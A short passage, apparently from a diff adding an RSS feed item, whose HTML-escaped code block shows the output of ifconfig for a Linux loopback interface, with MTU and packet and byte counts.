+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> UP LOOPBACK RUNNING MTU:16436 Metric:1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX packets:375 errors:0 dropped:0 overruns:0 frame:0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TX packets:375 errors:0 dropped:0 overruns:0 carrier:0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> collisions:0 txqueuelen:0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX bytes:157721 &lt;span class="o">(&lt;/span>154.0 KB&lt;span class="o">)&lt;/span> TX bytes:157721 &lt;span class="o">(&lt;/span>154.0 KB&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
